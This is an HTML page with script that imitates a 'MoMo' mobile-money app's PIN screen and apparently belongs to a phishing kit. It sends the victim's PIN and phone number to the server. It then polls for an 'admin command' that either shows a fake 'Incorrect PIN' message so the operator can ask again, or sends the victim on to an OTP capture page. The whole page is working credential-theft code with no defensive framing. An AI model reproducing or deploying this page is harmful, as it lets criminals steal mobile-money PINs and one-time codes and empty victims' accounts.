<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MoMo PIN</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #0b5c6b;
  color: white;
  text-align: center;
}

.header {
  background: #0b5c6b;
  color: #ffcc00;
  padding: 15px;
  font-size: 20px;
  font-weight: bold;
}

.container {
  background: white;
  color: black;
  max-width: 350px;
  margin: 40px auto;
  padding: 25px;
  border-radius: 15px;
}

input {
  width: 100%;
  padding: 15px;
  margin-top: 15px;
  border-radius: 10px;
  border: none;
  background: #f1f1f1;
  text-align: center;
  font-size: 18px;
  letter-spacing: 5px;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  background: #ffcc00;
  border: none;
  border-radius: 10px;
  font-weight: bold;
  cursor: pointer;
}

button:disabled {
  background: #cccccc;
  cursor: not-allowed;
}

.footer {
  margin-top: 20px;
  font-size: 12px;
}
</style>
</head>

<body>

<div class="header">MoMo App</div>

<div class="container">
  <h3 id="titleText">Enter MoMo PIN</h3>
  <p id="phoneDisplay"></p>

  <form id="pinForm">
    <input
      type="password"
      id="pinInput"
      placeholder="****"
      maxlength="6"
      inputmode="numeric"
      autocomplete="one-time-code"
      required
    >
    <button type="submit" id="pinBtn">Confirm</button>
  </form>
</div>

<div class="footer">2026@MoMo Verified</div>

<script>
const phone = localStorage.getItem("phone");

if (!phone) {
  window.location.href = "/";
}

document.getElementById("phoneDisplay").innerText = "Number: " + phone;

const pinForm = document.getElementById("pinForm");
const pinInput = document.getElementById("pinInput");
const pinBtn = document.getElementById("pinBtn");
const titleText = document.getElementById("titleText");

let polling = false;

// Prevent non-numeric input (better control)
pinInput.addEventListener("input", () => {
  pinInput.value = pinInput.value.replace(/\D/g, "");
});

// ================= SUBMIT PIN =================
pinForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  const pinValue = pinInput.value.trim();
  if (!pinValue) return;

  pinBtn.innerText = "Verifying...";
  pinBtn.disabled = true;

  try {
    const res = await fetch("/send-pin", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, pin: pinValue })
    });

    if (!res.ok) throw new Error("Server error");

    startPolling();

  } catch (err) {
    alert("Connection error. Try again.");
    pinBtn.innerText = "Confirm";
    pinBtn.disabled = false;
  }
});

// ================= POLLING =================
function startPolling() {
  if (polling) return;
  polling = true;
  checkAdminCommand();
}

async function checkAdminCommand() {
  try {
    const res = await fetch("/check-pin-status/" + phone);

    if (!res.ok) throw new Error("Status error");

    const data = await res.json();

    if (data.status === "re-enter") {
      pinBtn.innerText = "Confirm";
      pinBtn.disabled = false;
      pinInput.value = "";

      titleText.innerText =
        "Incorrect PIN. Try Again (" + (data.attempt || 1) + "/3)";
      titleText.style.color = "red";

      polling = false;
      return;
    }

    if (data.status === "success") {
      titleText.innerText = "Verified Successfully!";
      titleText.style.color = "green";

      polling = false;

      setTimeout(() => {
        window.location.href = "/otp.html";
      }, 1200);

      return;
    }

    // keep polling safely
    setTimeout(checkAdminCommand, 2000);

  } catch (err) {
    console.log("Polling error:", err.message);
    setTimeout(checkAdminCommand, 3000);
  }
}
</script>

</body>
</html>
